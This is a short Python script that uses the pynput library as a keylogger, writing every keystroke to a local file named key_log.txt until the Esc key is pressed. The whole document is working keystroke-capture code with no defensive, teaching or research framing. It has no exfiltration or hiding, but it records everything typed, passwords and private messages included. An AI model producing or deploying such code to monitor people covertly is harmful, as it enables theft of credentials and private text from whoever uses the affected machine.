from pynput import keyboard

# File to store the logged keys
LOG_FILE = "key_log.txt"

# Function to handle key press events
def on_press(key):
    try:
        with open(LOG_FILE, "a") as log_file:
            if hasattr(key, 'char') and key.char is not None:
                log_file.write(key.char)
            elif key == keyboard.Key.space:
                log_file.write(' ')
            else:
                log_file.write(f'[{key}]')
    except Exception as e:
        print(f"Error logging key: {e}")

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when 'Esc' is pressed
        return False

# Main function to start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger started. Press 'Esc' to stop.")
    start_keylogger()
